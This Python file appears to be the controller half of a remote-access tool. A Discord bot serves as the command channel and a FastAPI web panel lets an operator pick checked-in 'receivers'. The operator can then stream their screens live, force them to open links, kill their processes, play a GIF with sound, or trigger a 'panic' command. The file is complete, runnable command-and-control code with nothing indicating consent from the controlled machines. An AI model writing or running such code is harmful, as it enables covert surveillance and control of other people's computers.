import asyncio
import importlib
import json
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs


def ensure_dependencies():
    required = {
        "discord": "discord.py",
        "fastapi": "fastapi",
        "uvicorn": "uvicorn",
        "python_multipart": "python-multipart",
    }
    missing = []
    for mod, pkg in required.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])


ensure_dependencies()

import discord
from discord.ext import commands
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse


CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "1360236257212633260"))
BOT_TAG = os.getenv("BOT_TAG", "").strip()

assert CONTROLLER_TOKEN, "Set CONTROLLER_TOKEN"
assert COMMAND_CHANNEL_ID, "Set COMMAND_CHANNEL_ID"

ROOT_DIR = Path(__file__).parent
STATE_FILE = ROOT_DIR / "receivers.json"

STALE_SECONDS = 90
PRUNE_SECONDS = 60 * 60 * 24 * 30

_receivers: dict[str, dict] = {}
_selected_receiver: Optional[str] = None


def _load_state():
    global _receivers, _selected_receiver
    if not STATE_FILE.is_file():
        return
    try:
        data = json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except Exception:
        return
    if isinstance(data, dict):
        receivers = data.get("receivers")
        selected = data.get("selected")
        if isinstance(receivers, dict):
            _receivers = receivers
        if isinstance(selected, str) or selected is None:
            _selected_receiver = selected


def _save_state():
    data = {"receivers": _receivers, "selected": _selected_receiver}
    try:
        STATE_FILE.write_text(json.dumps(data), encoding="utf-8")
    except Exception:
        pass


def _prune_receivers(now: Optional[float] = None):
    global _selected_receiver
    if now is None:
        now = time.time()
    changed = False
    for rid in list(_receivers.keys()):
        info = _receivers.get(rid, {})
        last_seen = float(info.get("last_seen", 0) or 0)
        if now - last_seen > PRUNE_SECONDS:
            _receivers.pop(rid, None)
            changed = True
            if _selected_receiver == rid:
                _selected_receiver = None
    if changed:
        _save_state()


def _receiver_is_online(info: dict, now: float) -> bool:
    last_seen = float(info.get("last_seen", 0) or 0)
    return (now - last_seen) <= STALE_SECONDS


def _cmd_for_selected(cmd: str, *args: str) -> str:
    if not _selected_receiver:
        raise RuntimeError("No receiver selected")
    payload = " ".join([cmd, *[a for a in args if a]])
    return f"TARGET {_selected_receiver} {payload}"


def _build_live_ws_url(request: Request, rid: str) -> str:
    scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
    ws_scheme = "wss" if scheme == "https" else "ws"
    host = (
        request.headers.get("x-forwarded-host")
        or request.headers.get("host")
        or request.url.netloc
    )
    return f"{ws_scheme}://{host}/live/{rid}?role=sender"


async def _read_value(request: Request, name: str) -> Optional[str]:
    try:
        form = await request.form()
        value = form.get(name)
        if value is not None:
            return str(value)
    except Exception:
        pass
    try:
        data = await request.json()
        if isinstance(data, dict) and name in data:
            return str(data.get(name))
    except Exception:
        pass
    try:
        body = await request.body()
        if body:
            parsed = parse_qs(body.decode("utf-8", errors="ignore"))
            if name in parsed and parsed[name]:
                return parsed[name][0]
    except Exception:
        pass
    return request.query_params.get(name)


_load_state()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="?", intents=intents)

_controller_ready = asyncio.Event()
_controller_error: Optional[str] = None


async def _get_channel(cid: int) -> discord.TextChannel:
    channel = bot.get_channel(cid)
    if channel:
        return channel  # type: ignore[return-value]
    fetched = await bot.fetch_channel(cid)
    return fetched  # type: ignore[return-value]


async def _wait_controller_ready(timeout: float = 8.0) -> bool:
    try:
        await asyncio.wait_for(_controller_ready.wait(), timeout=timeout)
    except asyncio.TimeoutError:
        return False
    return _controller_error is None


async def _send_cmd(message: str):
    channel = await _get_channel(COMMAND_CHANNEL_ID)
    await channel.send(message)


async def _send_cmd_with_files(message: str, file_paths: list[Path]):
    channel = await _get_channel(COMMAND_CHANNEL_ID)
    files = []
    for path in file_paths:
        if not path.is_file():
            continue
        try:
            files.append(discord.File(fp=str(path), filename=path.name))
        except Exception:
            continue
    if files:
        await channel.send(content=message, files=files)
    else:
        await channel.send(content=message)


@bot.event
async def on_ready():
    print(f"[CONTROLLER] Logged in as {bot.user}")
    _controller_ready.set()


@bot.event
async def on_message(message: discord.Message):
    global _selected_receiver

    if message.channel.id != COMMAND_CHANNEL_ID:
        return

    content = (message.content or "").strip()
    if not content:
        return

    parts = content.split()
    if BOT_TAG and parts and parts[0] == BOT_TAG:
        parts = parts[1:]
    if len(parts) < 3:
        return

    status = parts[0].upper()
    if status not in ("ONLINE", "PING"):
        return

    rid = parts[1].strip()
    tag = parts[2].strip() or rid
    if not rid:
        return

    now = time.time()
    info = _receivers.get(rid, {})
    info["tag"] = tag
    info["last_seen"] = now
    _receivers[rid] = info
    if _selected_receiver is None:
        _selected_receiver = rid
    _save_state()


class LiveHub:
    def __init__(self):
        self.viewers: set[WebSocket] = set()
        self.lock = asyncio.Lock()
        self.latest: Optional[bytes] = None

    async def add_viewer(self, ws: WebSocket):
        async with self.lock:
            self.viewers.add(ws)

    async def remove_viewer(self, ws: WebSocket):
        async with self.lock:
            self.viewers.discard(ws)

    async def broadcast(self, data: bytes):
        self.latest = data
        dead: list[WebSocket] = []
        async with self.lock:
            for viewer in list(self.viewers):
                try:
                    await viewer.send_bytes(data)
                except Exception:
                    dead.append(viewer)
            for viewer in dead:
                self.viewers.discard(viewer)


_live_hubs: dict[str, LiveHub] = {}

app = FastAPI(title="Controller")

CONTROL_HTML = """<!doctype html>
<html lang=\"en\">
<head>
  <meta charset=\"UTF-8\">
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
  <title>Controller</title>
  <style>
    :root {
      --bg: #ffffff;
      --text: #000000;
      --muted: #3d3d3d;
      --line: #000000;
      --soft: #f4f4f4;
      --danger: #111111;
      --danger-text: #ffffff;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      background: var(--bg);
      color: var(--text);
      font-family: \"Segoe UI\", Tahoma, sans-serif;
    }
    #snow {
      position: fixed;
      inset: 0;
      overflow: hidden;
      pointer-events: none;
      z-index: 0;
    }
    .snowflake {
      position: absolute;
      top: -12px;
      border-radius: 50%;
      background: #000000;
      opacity: 0.16;
      animation-name: snow-fall;
      animation-timing-function: linear;
      animation-iteration-count: infinite;
      will-change: transform;
    }
    @keyframes snow-fall {
      from { transform: translate3d(0, -10vh, 0); }
      to { transform: translate3d(var(--drift), 110vh, 0); }
    }
    .wrap {
      position: relative;
      z-index: 1;
      max-width: 980px;
      margin: 24px auto;
      padding: 0 16px 32px;
    }
    .panel {
      border: 2px solid var(--line);
      background: #ffffffee;
      backdrop-filter: blur(2px);
      box-shadow: 8px 8px 0 #000000;
      padding: 18px;
    }
    h1 {
      margin: 0 0 16px 0;
      font-size: 28px;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }
    .row {
      display: grid;
      grid-template-columns: 1fr;
      gap: 12px;
      margin-bottom: 14px;
    }
    .grid {
      display: grid;
      gap: 10px;
      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
      margin-top: 10px;
    }
    label {
      display: block;
      font-size: 12px;
      margin-bottom: 6px;
      color: var(--muted);
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }
    select, input {
      width: 100%;
      padding: 10px;
      border: 2px solid #000;
      background: #fff;
      color: #000;
      font-size: 14px;
    }
    button {
      padding: 10px 12px;
      border: 2px solid #000;
      background: #000;
      color: #fff;
      cursor: pointer;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.03em;
    }
    button.alt {
      background: #fff;
      color: #000;
    }
    button.panic {
      background: var(--danger);
      color: var(--danger-text);
    }
    .status {
      margin: 8px 0 0;
      font-size: 13px;
      color: var(--muted);
      min-height: 20px;
    }
    .live {
      margin-top: 16px;
      border: 2px solid #000;
      background: var(--soft);
      min-height: 240px;
      display: grid;
      place-items: center;
      overflow: hidden;
    }
    .live img {
      width: 100%;
      height: auto;
      display: block;
    }
    .placeholder {
      padding: 18px;
      font-size: 13px;
      color: var(--muted);
      text-align: center;
    }
    .split {
      display: grid;
      grid-template-columns: 1fr;
      gap: 10px;
    }
    @media (min-width: 760px) {
      .split { grid-template-columns: 1fr 1fr; }
    }
  </style>
</head>
<body>
  <div id=\"snow\"></div>

  <main class=\"wrap\">
    <section class=\"panel\">
      <h1>Controller</h1>

      <div class=\"row\">
        <div>
          <label for=\"receiver-select\">Receiver</label>
          <select id=\"receiver-select\"></select>
        </div>
      </div>

      <div class=\"grid\">
        <button id=\"gif-start\">Display Gif</button>
        <button id=\"gif-stop\" class=\"alt\">Stop Gif</button>
        <button id=\"live-start\">Live Start</button>
        <button id=\"live-stop\" class=\"alt\">Live Stop</button>
        <button id=\"panic\" class=\"panic\">Panic</button>
      </div>

      <div class=\"split\" style=\"margin-top: 14px;\">
        <div>
          <label for=\"open-url\">Open Link</label>
          <input id=\"open-url\" type=\"text\" placeholder=\"https://example.com\" />
          <button id=\"open-btn\" style=\"margin-top: 8px;\">Open</button>
        </div>
        <div>
          <label for=\"close-proc\">Close Process</label>
          <input id=\"close-proc\" type=\"text\" placeholder=\"chrome.exe\" />
          <button id=\"close-btn\" style=\"margin-top: 8px;\">Close</button>
        </div>
      </div>

      <p id=\"status\" class=\"status\">Loading...</p>

      <div class=\"live\">
        <img id=\"live-img\" alt=\"Live feed\" style=\"display:none;\" />
        <div id=\"live-placeholder\" class=\"placeholder\">Live preview is idle.</div>
      </div>
    </section>
  </main>

  <script>
    const receiverSelect = document.getElementById("receiver-select");
    const statusEl = document.getElementById("status");
    const liveImg = document.getElementById("live-img");
    const livePlaceholder = document.getElementById("live-placeholder");

    let selectedReceiver = null;
    let liveSocket = null;
    let liveBlobUrl = null;

    function setStatus(text, isError = false) {
      statusEl.textContent = text;
      statusEl.style.color = isError ? "#8b0000" : "#3d3d3d";
    }

    function makeSnow() {
      const holder = document.getElementById("snow");
      for (let i = 0; i < 80; i++) {
        const flake = document.createElement("span");
        flake.className = "snowflake";
        const size = 2 + Math.random() * 5;
        flake.style.width = size + "px";
        flake.style.height = size + "px";
        flake.style.left = (Math.random() * 100) + "%";
        flake.style.animationDuration = (7 + Math.random() * 11) + "s";
        flake.style.animationDelay = (-Math.random() * 20) + "s";
        flake.style.setProperty("--drift", ((Math.random() * 80) - 40) + "px");
        holder.appendChild(flake);
      }
    }

    async function post(path, body = null) {
      const opts = { method: "POST", headers: {} };
      if (body) {
        opts.headers["Content-Type"] = "application/x-www-form-urlencoded";
        opts.body = new URLSearchParams(body);
      }
      const res = await fetch(path, opts);
      let payload = { ok: res.ok };
      try {
        payload = await res.json();
      } catch (e) {}
      if (!res.ok) {
        throw new Error(payload.error || ("HTTP " + res.status));
      }
      return payload;
    }

    async function refreshReceivers() {
      try {
        const res = await fetch("/api/receivers");
        const data = await res.json();
        const items = Array.isArray(data.items) ? data.items : [];
        const preferred = data.selected || selectedReceiver;

        receiverSelect.innerHTML = "";
        if (!items.length) {
          const opt = document.createElement("option");
          opt.value = "";
          opt.textContent = "No receivers online";
          receiverSelect.appendChild(opt);
          selectedReceiver = null;
          setStatus("No receivers detected yet.");
          return;
        }

        for (const item of items) {
          const opt = document.createElement("option");
          opt.value = item.id;
          const marker = item.online ? "ONLINE" : "OFFLINE";
          opt.textContent = "[" + marker + "] " + (item.name || item.id);
          receiverSelect.appendChild(opt);
        }

        let pick = preferred;
        if (!items.some(x => x.id === pick)) {
          pick = items[0].id;
        }
        selectedReceiver = pick;
        receiverSelect.value = pick;

        if (data.selected !== pick) {
          post("/api/select", { receiver: pick }).catch(() => {});
        }

        const current = items.find(x => x.id === pick);
        if (current) {
          setStatus("Selected: " + (current.name || current.id));
        }
      } catch (e) {
        setStatus("Failed to load receivers: " + e.message, true);
      }
    }

    function closeLivePreview() {
      if (liveSocket) {
        liveSocket.close();
        liveSocket = null;
      }
      if (liveBlobUrl) {
        URL.revokeObjectURL(liveBlobUrl);
        liveBlobUrl = null;
      }
      liveImg.style.display = "none";
      livePlaceholder.style.display = "block";
    }

    function openLivePreview() {
      closeLivePreview();
      if (!selectedReceiver) {
        return;
      }
      const proto = location.protocol === "https:" ? "wss" : "ws";
      const url = proto + "://" + location.host + "/live/" + encodeURIComponent(selectedReceiver) + "?role=viewer";
      const ws = new WebSocket(url);
      ws.binaryType = "arraybuffer";
      ws.onmessage = (ev) => {
        if (!(ev.data instanceof ArrayBuffer)) return;
        if (liveBlobUrl) {
          URL.revokeObjectURL(liveBlobUrl);
        }
        liveBlobUrl = URL.createObjectURL(new Blob([ev.data], { type: "image/jpeg" }));
        liveImg.src = liveBlobUrl;
        livePlaceholder.style.display = "none";
        liveImg.style.display = "block";
      };
      ws.onclose = () => {
        if (liveSocket === ws) {
          liveSocket = null;
        }
      };
      liveSocket = ws;
    }

    async function runAction(path, body = null) {
      if (!selectedReceiver) {
        setStatus("Select a receiver first.", true);
        return false;
      }
      try {
        const resp = await post(path, body);
        setStatus(resp.message || "Command sent.");
        return true;
      } catch (e) {
        setStatus(e.message, true);
        return false;
      }
    }

    receiverSelect.addEventListener("change", async () => {
      const value = receiverSelect.value || null;
      selectedReceiver = value;
      if (!value) {
        setStatus("Select a receiver first.", true);
        return;
      }
      try {
        await post("/api/select", { receiver: value });
        setStatus("Selected receiver updated.");
      } catch (e) {
        setStatus(e.message, true);
      }
    });

    document.getElementById("gif-start").addEventListener("click", () => runAction("/api/gif/start"));
    document.getElementById("gif-stop").addEventListener("click", () => runAction("/api/gif/stop"));

    document.getElementById("open-btn").addEventListener("click", () => {
      const url = (document.getElementById("open-url").value || "").trim();
      if (!url) {
        setStatus("Enter a URL first.", true);
        return;
      }
      runAction("/api/open", { url });
    });

    document.getElementById("close-btn").addEventListener("click", () => {
      const proc = (document.getElementById("close-proc").value || "").trim();
      if (!proc) {
        setStatus("Enter a process name first.", true);
        return;
      }
      runAction("/api/close", { proc });
    });

    document.getElementById("live-start").addEventListener("click", async () => {
      const ok = await runAction("/api/live/start");
      if (ok) {
        openLivePreview();
      }
    });

    document.getElementById("live-stop").addEventListener("click", async () => {
      await runAction("/api/live/stop");
      closeLivePreview();
    });

    document.getElementById("panic").addEventListener("click", async () => {
      if (!confirm("Trigger panic mode on selected receiver?")) {
        return;
      }
      await runAction("/api/panic");
      closeLivePreview();
    });

    makeSnow();
    refreshReceivers();
    setInterval(refreshReceivers, 5000);
  </script>
</body>
</html>
"""


@app.get("/")
async def index():
    return HTMLResponse(CONTROL_HTML)


@app.get("/api/receivers")
async def api_receivers():
    now = time.time()
    _prune_receivers(now)

    items = []
    for rid, info in _receivers.items():
        name = str(info.get("tag") or rid)
        items.append(
            {
                "id": rid,
                "name": name,
                "online": _receiver_is_online(info, now),
                "last_seen": float(info.get("last_seen", 0) or 0),
            }
        )
    items.sort(key=lambda item: (not item["online"], item["name"].lower()))

    return JSONResponse({"items": items, "selected": _selected_receiver})


@app.post("/api/select")
async def api_select(request: Request):
    global _selected_receiver

    rid = await _read_value(request, "receiver")
    if not rid:
        return JSONResponse({"ok": False, "error": "receiver is required"}, status_code=400)
    _prune_receivers()
    if rid not in _receivers:
        return JSONResponse({"ok": False, "error": "receiver not found"}, status_code=404)

    _selected_receiver = rid
    _save_state()
    return JSONResponse({"ok": True, "message": "Receiver selected."})


async def _send_selected_command(cmd: str, *args: str):
    if not _selected_receiver:
        raise RuntimeError("No receiver selected")
    if not await _wait_controller_ready():
        raise RuntimeError("Controller bot not ready")
    await _send_cmd(_cmd_for_selected(cmd, *args))


@app.post("/api/gif/start")
async def api_gif_start():
    if not _selected_receiver:
        return JSONResponse({"ok": False, "error": "select a receiver first"}, status_code=400)
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "controller bot not ready"}, status_code=503)

    files: list[Path] = []
    gif = ROOT_DIR / "M.gif"
    if gif.is_file():
        files.append(gif)
    sound = ROOT_DIR / "sound.mp3"
    if sound.is_file():
        files.append(sound)

    msg = _cmd_for_selected("DISPLAY_GIF_START")
    if files:
        await _send_cmd_with_files(msg, files)
    else:
        await _send_cmd(msg)

    return JSONResponse({"ok": True, "message": "GIF command sent."})


@app.post("/api/gif/stop")
async def api_gif_stop():
    try:
        await _send_selected_command("DISPLAY_GIF_STOP")
    except RuntimeError as err:
        code = 503 if "not ready" in str(err).lower() else 400
        return JSONResponse({"ok": False, "error": str(err)}, status_code=code)
    return JSONResponse({"ok": True, "message": "GIF stop command sent."})


@app.post("/api/open")
async def api_open(request: Request):
    url = (await _read_value(request, "url") or "").strip()
    if not url:
        return JSONResponse({"ok": False, "error": "url is required"}, status_code=400)
    try:
        await _send_selected_command("OPEN_LINK", url)
    except RuntimeError as err:
        code = 503 if "not ready" in str(err).lower() else 400
        return JSONResponse({"ok": False, "error": str(err)}, status_code=code)
    return JSONResponse({"ok": True, "message": "Open command sent."})


@app.post("/api/close")
async def api_close(request: Request):
    proc = (await _read_value(request, "proc") or "").strip()
    if not proc:
        return JSONResponse({"ok": False, "error": "proc is required"}, status_code=400)
    try:
        await _send_selected_command("KILL_PROCESS", proc)
    except RuntimeError as err:
        code = 503 if "not ready" in str(err).lower() else 400
        return JSONResponse({"ok": False, "error": str(err)}, status_code=code)
    return JSONResponse({"ok": True, "message": "Close command sent."})


@app.post("/api/live/start")
async def api_live_start(request: Request):
    if not _selected_receiver:
        return JSONResponse({"ok": False, "error": "select a receiver first"}, status_code=400)
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "controller bot not ready"}, status_code=503)

    ws_url = _build_live_ws_url(request, _selected_receiver)
    await _send_cmd(_cmd_for_selected("LIVE_START", ws_url))
    return JSONResponse({"ok": True, "message": "Live stream start command sent."})


@app.post("/api/live/stop")
async def api_live_stop():
    try:
        await _send_selected_command("LIVE_STOP")
    except RuntimeError as err:
        code = 503 if "not ready" in str(err).lower() else 400
        return JSONResponse({"ok": False, "error": str(err)}, status_code=code)
    return JSONResponse({"ok": True, "message": "Live stream stop command sent."})


@app.post("/api/panic")
async def api_panic():
    try:
        await _send_selected_command("PANIC")
    except RuntimeError as err:
        code = 503 if "not ready" in str(err).lower() else 400
        return JSONResponse({"ok": False, "error": str(err)}, status_code=code)
    return JSONResponse({"ok": True, "message": "Panic command sent."})


@app.websocket("/live/{rid}")
async def live_ws(ws: WebSocket, rid: str, role: str = "viewer"):
    await ws.accept()
    hub = _live_hubs.setdefault(rid, LiveHub())

    if role == "sender":
        try:
            while True:
                data = await ws.receive_bytes()
                await hub.broadcast(data)
        except WebSocketDisconnect:
            return
        except Exception:
            return

    await hub.add_viewer(ws)
    if hub.latest:
        try:
            await ws.send_bytes(hub.latest)
        except Exception:
            pass

    try:
        while True:
            await ws.receive()
    except WebSocketDisconnect:
        pass
    finally:
        await hub.remove_viewer(ws)


@app.on_event("startup")
async def startup():
    async def run_bot():
        global _controller_error
        try:
            await bot.start(CONTROLLER_TOKEN)
        except Exception as exc:
            _controller_error = str(exc)
            _controller_ready.set()
            print("[CONTROLLER] Bot failed:", exc)

    asyncio.create_task(run_bot())
